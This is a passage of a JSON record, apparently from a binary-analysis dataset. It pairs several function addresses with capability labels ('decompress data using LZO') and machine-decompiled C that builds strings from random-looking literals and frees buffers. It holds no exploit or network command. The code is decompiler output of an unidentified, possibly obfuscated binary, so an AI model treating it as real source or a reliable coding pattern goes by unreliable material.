        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.004058b7(uint param_1, uint param_2, uint32_t param_3)\n\n{\n    uchar **ppuVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_0000001c;\n    uint32_t in_stack_00000020;\n    uint32_t in_stack_00000024;\n    uint in_stack_00000034;\n    uint32_t in_stack_00000038;\n    uchar *in_stack_00000048;\n    uint32_t in_stack_0000005c;\n    uint32_t in_stack_fffffe84;\n    uint32_t in_stack_fffffe9c;\n    uint uStack312;\n    uchar uStack308;\n    char *pcStack304;\n    int32_t iStack300;\n    uint uStack284;\n    uint32_t uStack280;\n    int32_t iStack276;\n    uint uStack260;\n    uint32_t uStack256;\n    uint32_t uStack252;\n    uint uStack236;\n    uint32_t uStack232;\n    int32_t iStack228;\n    uint uStack212;\n    uint32_t uStack208;\n    uchar uStack204;\n    uint *puStack200;\n    int32_t *piStack196;\n    uint uStack192;\n    uint uStack188;\n    int32_t iStack184;\n    uint32_t uStack180;\n    int32_t iStack164;\n    uint uStack140;\n    uchar uStack136;\n    char *pcStack132;\n    int32_t iStack128;\n    uint uStack112;\n    uint32_t uStack108;\n    uchar uStack104;\n    uint *puStack100;\n    int32_t *piStack96;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint32_t uStack80;\n    uchar **ppuStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack84 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c240;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_00000020 < 0x10) {\ncode_r0x00425a88:\n        ppuStack32 = ppuVar1;\n        in_stack_0000001c = 0;\n        in_stack_00000020 = 0xf;\n        param_3 = param_3 & 0xffffff00;\n        if (0xf < in_stack_00000038) {\n            uStack180 = in_stack_00000024;\n            if ((0xfff < in_stack_00000038 + 1) &&\n               (uStack180 = *(in_stack_00000024 - 4),  unaff_EDI = uStack180, \n               0x1f < (in_stack_00000024 - 4) - uStack180)) goto code_r0x00425b33;\n            fcn.00401a32(uStack180);\n        }\n        in_stack_00000034 = 0;\n        in_stack_00000038 = 0xf;\n        in_stack_00000024 = in_stack_00000024 & 0xffffff00;\n        if (in_stack_0000005c < 0x10) {\ncode_r0x00425b14:\n            *in_FS_OFFSET = piStack28;\n            return piStack28;\n        }\n        puStack84 = in_stack_00000048;\n        if ((in_stack_0000005c + 1 < 0x1000) ||\n           (puStack84 = *(in_stack_00000048 + -4),  uStack180 = unaff_EDI,  in_stack_00000048 + (-4 - puStack84) < 0x20)\n           ) {\n            fcn.00401a32(puStack84);\n            goto code_r0x00425b14;\n        }\n    }\n    else {\n        uStack180 = param_3;\n        if ((in_stack_00000020 + 1 < 0x1000) ||\n           (uStack180 = *(param_3 - 4),  unaff_EDI = uStack180,  (param_3 - 4) - uStack180 < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(uStack180);\n            ppuVar1 = ppuStack32;\n            goto code_r0x00425a88;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\ncode_r0x00425b33:\n        uStack20 = 1;\n        fcn.004047f5();\n    }\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puStack100 = &uStack140;\n    uStack88 = 0xffffffff;\n    uStack92 = 0x44c250;\n    piStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack96;\n    uStack112 = 0;\n    uStack108 = 0xf;\n    iStack128 = 0;\n    uStack136 = uStack104;\n    pcStack132 = \"pkgfwuwtyulaveguohzpsfratrcenvwjpjidtkxtrbdeajithdmrpgwjndaudbtwwjg\";\n    uStack140 = 0x43;\n    uStack80 = uStack180;\n    fcn.00402f72();\n    if (uStack108 < 0x10) {\ncode_r0x00425c1d:\n        *in_FS_OFFSET = piStack96;\n        return 1;\n    }\n    iStack184 = iStack128;\n    if ((uStack108 + 1 < 0x1000) || (iStack184 = *(iStack128 + -4),  (iStack128 + -4) - iStack184 < 0x20)) {\n        fcn.00401a32(iStack184);\n        goto code_r0x00425c1d;\n    }\n    uStack88 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    puStack200 = &uStack312;\n    uStack192 = 0x44c260;\n    piStack196 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack196;\n    uStack284 = 0;\n    uStack280 = 0xf;\n    iStack300 = 0;\n    uStack188 = 9;\n    uStack308 = iStack276;\n    pcStack304 = \"fxhneqsomvognypanjtlanzvzrwqodqizgigzirkotxmgxtlolzazkensoalbctlchdlgwuhseatyey\";\n    uStack312 = 0x4f;\n    fcn.00402f72();\n    uStack260 = 0;\n    uStack256 = 0xf;\n    iStack276 = 0;\n    uStack188 = 10;\n    fcn.00402f72(0x49, iStack228, \"weesockfltfksflvlqqgdycfvgghnurfumnedzdehjvyxtzgyjwysxodjbnfbeijfsguzhzlo\");\n    uStack212 = 0;\n    uStack208 = 0xf;\n    iStack228 = 0;\n    uStack188 = 0xb;\n    fcn.00402f72(0x4f, uStack252, \"fxhneqsomvognypanjtlanzvzrwqodqizgigzirkotxmgxtlolzazkensoalbctlchdlgwuhseatyey\");\n    uStack236 = 0;\n    uStack232 = 0xf;\n    uStack252 = 0;\n    uStack188 = 0xe;\n    fcn.00402f72(0x4f, uStack204, \"fxhneqsomvognypanjtlanzvzrwqodqizgigzirkotxmgxtlolzazkensoalbctlchdlgwuhseatyey\");\n    if (uStack232 < 0x10) {\ncode_r0x00425dbe:\n        if (0xf < uStack208) {\n            in_stack_fffffe9c = uStack208 + 1;\n            iVar2 = iStack228;\n            if (0xfff < in_stack_fffffe9c) {\n                iVar2 = *(iStack228 + -4);\n                if (0x1f < (iStack228 + -4) - iVar2) goto code_r0x004260b6;\n                in_stack_fffffe9c = uStack208 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack212 = 0;\n        uStack208 = 0xf;\n        iStack228 = 0;\n        uStack188 = 0xb;\n        fcn.00402f72(0x4f, in_stack_fffffe9c & 0xffffff00 | uStack252 & 0xff, \n                     \"fxhneqsomvognypanjtlanzvzrwqodqizgigzirkotxmgxtlolzazkensoalbctlchdlgwuhseatyey\");\n        uStack236 = 0;\n        uStack232 = 0xf;\n        uStack252 = 0;\n        uStack188 = 0xd;\n        fcn.00402f72(0x4f, uStack204, \"fxhneqsomvognypanjtlanzvzrwqodqizgigzirkotxmgxtlolzazkensoalbctlchdlgwuhseatyey\")\n        ;\n        if (0xf < uStack232) {\n            in_stack_fffffe84 = uStack232 + 1;\n            uVar3 = uStack252;\n            if (0xfff < in_stack_fffffe84) {\n                uVar3 = *(uStack252 - 4);\n                if (0x1f < (uStack252 - 4) - uVar3) goto code_r0x004260c2;\n                in_stack_fffffe84 = uStack232 + 0x24;\n            }\n            fcn.00401a32(uVar3);\n        }\n        if (0xf < uStack208) {\n            in_stack_fffffe84 = uStack208 + 1;\n            iVar2 = iStack228;\n            if (0xfff < in_stack_fffffe84) {\n                iVar2 = *(iStack228 + -4);\n                if (0x1f < (iStack228 + -4) - iVar2) goto code_r0x004260ce;\n                in_stack_fffffe84 = uStack208 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack212 = 0;\n        uStack208 = 0xf;\n        iStack228 = 0;\n        uStack188 = 0xb;\n        fcn.00402f72(0x49, in_stack_fffffe84 & 0xffffff00 | uStack252 & 0xff, \n                     \"weesockfltfksflvlqqgdycfvgghnurfumnedzdehjvyxtzgyjwysxodjbnfbeijfsguzhzlo\");\n        uStack236 = 0;\n        uStack232 = 0xf;\n        uStack252 = 0;\n        uStack188 = 0xc;\n        fcn.00402f72(0x49, uStack204, \"weesockfltfksflvlqqgdycfvgghnurfumnedzdehjvyxtzgyjwysxodjbnfbeijfsguzhzlo\");\n        if (0xf < uStack232) {\n            uVar3 = uStack252;\n            if ((0xfff < uStack232 + 1) && (uVar3 = *(uStack252 - 4),  0x1f < (uStack252 - 4) - uVar3))\n            goto code_r0x004260da;\n            fcn.00401a32(uVar3);\n        }\n        if (0xf < uStack208) {\n            iVar2 = iStack228;\n            if ((0xfff < uStack208 + 1) && (iVar2 = *(iStack228 + -4),  0x1f < (iStack228 + -4) - iVar2))\n            goto code_r0x004260e6;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack256) {\n            iVar2 = iStack276;\n            if ((0xfff < uStack256 + 1) && (iVar2 = *(iStack276 + -4),  0x1f < (iStack276 + -4) - iVar2))\n            goto code_r0x004260f2;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack280) {\n            iVar2 = iStack300;\n            if ((0xfff < uStack280 + 1) && (iVar2 = *(iStack300 + -4),  0x1f < (iStack300 + -4) - iVar2))\n            goto code_r0x004260fe;\n            fcn.00401a32(iVar2);\n        }\n        if ((iStack164 + -4) - *(iStack164 + -4) < 0x20) {\n            fcn.00401a32(*(iStack164 + -4));\n            *in_FS_OFFSET = piStack196;\n            return piStack196;\n        }\n    }\n    else {\n        in_stack_fffffe9c = uStack232 + 1;\n        uVar3 = uStack252;\n        if (in_stack_fffffe9c < 0x1000) {\ncode_r0x00425db2:\n            fcn.00401a32(uVar3);\n            goto code_r0x00425dbe;\n        }\n        uVar3 = *(uStack252 - 4);\n        if ((uStack252 - 4) - uVar3 < 0x20) {\n            in_stack_fffffe9c = uStack232 + 0x24;\n            goto code_r0x00425db2;\n        }\n        uStack188 = 0;\n        fcn.004047f5();\ncode_r0x004260b6:\n        uStack188 = 1;\n        fcn.004047f5();\ncode_r0x004260c2:\n        uStack188 = 2;\n        fcn.004047f5();\ncode_r0x004260ce:\n        uStack188 = 3;\n        fcn.004047f5();\ncode_r0x004260da:\n        uStack188 = 4;\n        fcn.004047f5();\ncode_r0x004260e6:\n        uStack188 = 5;\n        fcn.004047f5();\ncode_r0x004260f2:\n        uStack188 = 6;\n        fcn.004047f5();\ncode_r0x004260fe:\n        uStack188 = 7;\n        fcn.004047f5();\n    }\n    uStack188 = 8;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    iVar2 = fcn.00403a76();\n    return iVar2;\n}\n",
        "token_count": 3576
    },
    "0040456b": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040456b(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_ffffff2c;\n    uint32_t in_stack_ffffff44;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c410;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    pcStack136 = \"roepngpvdwtehajeaiwsrmserniavvhziddznajypx\";\n    auStack144[0] = 0x2a;\n    fcn.00402f72();\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 8;\n    fcn.00402f72(0x32, iStack60, \"erjjibjqwxmmfccqytcblgqbtfeajovaeebyltmgyblcvnaonl\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x2a, uStack84, \"roepngpvdwtehajeaiwsrmserniavvhziddznajypx\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x2a, uStack36, \"roepngpvdwtehajeaiwsrmserniavvhziddznajypx\");\n    if (uStack64 < 0x10) {\ncode_r0x0042bec7:\n        if (0xf < uStack40) {\n            in_stack_ffffff44 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff44) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x0042c17f;\n                in_stack_ffffff44 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x32, in_stack_ffffff44 & 0xffffff00 | uStack84 & 0xff, \n                     \"erjjibjqwxmmfccqytcblgqbtfeajovaeebyltmgyblcvnaonl\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xb;\n        fcn.00402f72(0x32, uStack36, \"erjjibjqwxmmfccqytcblgqbtfeajovaeebyltmgyblcvnaonl\");\n        if (0xf < uStack64) {\n            in_stack_ffffff2c = uStack64 + 1;\n            uVar1 = uStack84;\n            if (0xfff < in_stack_ffffff2c) {\n                uVar1 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar1) goto code_r0x0042c18b;\n                in_stack_ffffff2c = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            in_stack_ffffff2c = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff2c) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x0042c197;\n                in_stack_ffffff2c = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 9;\n        fcn.00402f72(0x2a, in_stack_ffffff2c & 0xffffff00 | uStack84 & 0xff, \n                     \"roepngpvdwtehajeaiwsrmserniavvhziddznajypx\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 10;\n        fcn.00402f72(0x2a, uStack36, \"roepngpvdwtehajeaiwsrmserniavvhziddznajypx\");\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x0042c1a3;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0042c1af;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x0042c1bb;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x0042c1c7;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    in_stack_ffffff44 = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_ffffff44 < 0x1000) {\ncode_r0x0042bebb:\n        fcn.00401a32(uVar1);\n        goto code_r0x0042bec7;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff44 = uStack64 + 0x24;\n        goto code_r0x0042bebb;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042c17f:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042c18b:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0042c197:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0042c1a3:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0042c1af:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x0042c1bb:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x0042c1c7:\n    uStack20 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 2108
    },
    "0040457f": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Heritage AFTER dead removal. Example location: s0x00000004 : 0x0042feb6\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint * fcn.0040457f(uchar *param_1)\n\n{\n    uchar **ppuVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    int32_t unaff_EBX;\n    uchar *unaff_EDI;\n    uint32_t **in_FS_OFFSET;\n    uint in_stack_00000014;\n    uint32_t in_stack_00000018;\n    uchar *in_stack_0000001c;\n    uint in_stack_0000002c;\n    uint32_t in_stack_00000030;\n    uint *in_stack_00000038;\n    uint32_t in_stack_0000004c;\n    int32_t aiStack200 [4];\n    uint uStack184;\n    uint32_t uStack180;\n    int32_t iStack176;\n    uint uStack160;\n    uint32_t uStack156;\n    uint *puStack152;\n    uchar uStack148;\n    int32_t *piStack144;\n    uint32_t *puStack140;\n    uint uStack136;\n    uint uStack132;\n    uchar *puStack128;\n    uchar *puStack124;\n    uint *in_stack_ffffff94;\n    uchar **ppuStack100;\n    uint32_t *puStack96;\n    uint uStack92;\n    uint uStack88;\n    uint *puStack84;\n    uchar *puStack80;\n    uint32_t uStack56;\n    uchar **ppuStack32;\n    uint32_t *puStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack84 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c540;\n    puStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack28;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_00000018 < 0x10) {\ncode_r0x0042fd77:\n        ppuStack32 = ppuVar1;\n        in_stack_00000014 = 0;\n        in_stack_00000018 = 0xf;\n        param_1 = param_1 & 0xffffff00;\n        if (0xf < in_stack_00000030) {\n            puStack124 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (puStack124 = *(in_stack_0000001c + -4),  unaff_EDI = puStack124, \n               0x1f < in_stack_0000001c + (-4 - puStack124))) goto code_r0x0042fe23;\n            fcn.00401a32(puStack124);\n        }\n        in_stack_0000002c = 0;\n        in_stack_00000030 = 0xf;\n        in_stack_0000001c = in_stack_0000001c & 0xffffff00;\n        if (in_stack_0000004c < 0x10) {\ncode_r0x0042fe02:\n            *in_FS_OFFSET = puStack28;\n            return NULL;\n        }\n        puStack84 = in_stack_00000038;\n        if ((in_stack_0000004c + 1 < 0x1000) ||\n           (puStack84 = in_stack_00000038[-1],  puStack124 = unaff_EDI,  puStack152 = in_stack_ffffff94, \n           in_stack_00000038 + (-4 - puStack84) < 0x20)) {\n            fcn.00401a32(puStack84);\n            goto code_r0x0042fe02;\n        }\n    }\n    else {\n        puStack124 = param_1;\n        if ((in_stack_00000018 + 1 < 0x1000) ||\n           (puStack124 = *(param_1 + -4),  unaff_EDI = puStack124,  param_1 + (-4 - puStack124) < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(puStack124);\n            ppuVar1 = ppuStack32;\n            goto code_r0x0042fd77;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\ncode_r0x0042fe23:\n        uStack20 = 1;\n        fcn.004047f5();\n        puStack152 = in_stack_ffffff94;\n    }\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    ppuStack100 = &ppuStack100;\n    uStack88 = 0xffffffff;\n    uStack92 = 0x44c550;\n    puStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack96;\n    if (puStack28 < 0x10) {\ncode_r0x0042fed4:\n        *in_FS_OFFSET = puStack96;\n        return puStack96;\n    }\n    puVar4 = &stack0x00000008;\n    puStack80 = puStack124;\n    if ((puStack28 + 1U < 0x1000) || (puStack128 = param_1,  puVar4 = param_1,  &param_1 - param_1 < 0x20)) {\n        ppuStack100 = &ppuStack100;\n        fcn.00401a32(puVar4);\n        goto code_r0x0042fed4;\n    }\n    uStack88 = 0;\n    fcn.004047f5();\n    fcn.004052d1();\n    piStack144 = aiStack200;\n    uStack136 = 0x44c560;\n    puStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack140;\n    uStack156 = 0xf;\n    uStack160 = 2;\n    iStack176 = 0x6d6a;\n    uStack184 = 0;\n    uStack180 = 0xf;\n    aiStack200[0] = 0;\n    uStack132 = 5;\n    puVar2 = puStack152;\n    fcn.00402f72(0x31, uStack148, \"dvmzerbbgymmxgpllspyhxlwcpyvujuvuetsuikgwhartlbzp\");\n    puStack152[5] = 0xf;\n    puStack152[4] = 3;\n    *puStack152 = 0x666164;\n    if (uStack180 < 0x10) {\ncode_r0x0042fff2:\n        if (0xf < uStack156) {\n            iVar3 = iStack176;\n            if ((0xfff < uStack156 + 1) && (iVar3 = *(iStack176 + -4),  0x1f < (iStack176 + -4) - iVar3))\n            goto code_r0x0043011d;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < puStack80) {\n            puVar4 = ppuStack100;\n            if ((0xfff < puStack80 + 1) && (puVar4 = *(ppuStack100 + -4),  0x1f < ppuStack100 + (-4 - puVar4)))\n            goto code_r0x00430129;\n            fcn.00401a32(puVar4);\n        }\n        puStack84 = NULL;\n        puStack80 = 0xf;\n        ppuStack100 = ppuStack100 & 0xffffff00;\n        if (0xf < uStack56) {\n            iVar3 = unaff_EBX;\n            if ((0xfff < uStack56 + 1) && (iVar3 = *(unaff_EBX + -4),  0x1f < (unaff_EBX + -4) - iVar3))\n            goto code_r0x00430135;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < puStack28) {\n            puVar4 = &stack0x00000008;\n            if ((0xfff < puStack28 + 1U) && (puVar4 = param_1,  0x1f < &param_1 - param_1)) goto code_r0x00430141;\n            fcn.00401a32(puVar4);\n        }\n        *in_FS_OFFSET = puStack140;\n        return puVar2;\n    }\n    iVar3 = aiStack200[0];\n    if ((uStack180 + 1 < 0x1000) || (iVar3 = *(aiStack200[0] + -4),  (aiStack200[0] + -4) - iVar3 < 0x20)) {\n        fcn.00401a32(iVar3);\n        goto code_r0x0042fff2;\n    }\n    uStack132 = 0;\n    fcn.004047f5();\ncode_r0x0043011d:\n    uStack132 = 1;\n    fcn.004047f5();\ncode_r0x00430129:\n    uStack132 = 2;\n    fcn.004047f5();\ncode_r0x00430135:\n    uStack132 = 3;\n    fcn.004047f5();\ncode_r0x00430141:\n    uStack132 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    fcn.00403a76();\n    puVar2 = fcn.00403a76();\n    return puVar2;\n}\n",
        "token_count": 2242
    },
    "004045ca": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.004045ca(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    int32_t in_stack_0000004c;\n    uint32_t in_stack_00000060;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c810;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 4;\n    fcn.00402f72(0x31);\n    if (uStack40 < 0x10) {\ncode_r0x00437dd6:\n        if (0xf < in_stack_0000001c) {\n            iVar2 = param_2;\n            if ((0xfff < in_stack_0000001c + 1) && (iVar2 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar2))\n            goto code_r0x00437ec8;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000034) {\n            iVar2 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (iVar2 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar2)) goto code_r0x00437ed4;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000060) {\n            iVar2 = in_stack_0000004c;\n            if ((0xfff < in_stack_00000060 + 1) &&\n               (iVar2 = *(in_stack_0000004c + -4),  0x1f < (in_stack_0000004c + -4) - iVar2)) goto code_r0x00437ee0;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0;\n    }\n    iVar2 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00437dd6;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00437ec8:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00437ed4:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00437ee0:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 851
    },
    "0040476e": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint * fcn.0040476e(uint *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    uint auStack76 [2];\n    char *pcStack68;\n    int32_t iStack64;\n    uint uStack48;\n    uint32_t uStack44;\n    uint *puStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack76;\n    uStack24 = 0x44c2b0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    puStack40 = param_1;\n    uStack48 = 0;\n    uStack44 = 0xf;\n    iStack64 = 0;\n    uStack20 = 2;\n    pcStack68 = \"pqyzufrszctefaovyihjiyeouftrdwlanujyabujibyjfqwernkujtskduj\";\n    auStack76[0] = 0x3b;\n    fcn.00402f72();\n    *puStack40 = 0;\n    puStack40[4] = 0;\n    puStack40[5] = 0xf;\n    *puStack40 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x12, uStack36, \"hgqgybygmwuhcgjutb\");\n    if (0xf < uStack44) {\n        iVar2 = iStack64;\n        if ((0xfff < uStack44 + 1) && (iVar2 = *(iStack64 + -4),  0x1f < (iStack64 + -4) - iVar2)) {\n            uStack20 = 0;\n            fcn.004047f5();\n            goto code_r0x00426b96;\n        }\n        fcn.00401a32(iVar2);\n    }\n    if (0xf < in_stack_0000001c) {\n        iVar2 = param_2;\n        if ((0xfff < in_stack_0000001c + 1) && (iVar2 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar2)) {\ncode_r0x00426b96:\n            uStack20 = 1;\n            fcn.004047f5();\n            fcn.004052d1();\n            fcn.004052d1();\n            puVar1 = fcn.00403a76();\n            return puVar1;\n        }\n        fcn.00401a32(iVar2);\n    }\n    *in_FS_OFFSET = piStack28;\n    return param_1;\n}\n",
        "token_count": 643
    },
    "004057b8": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
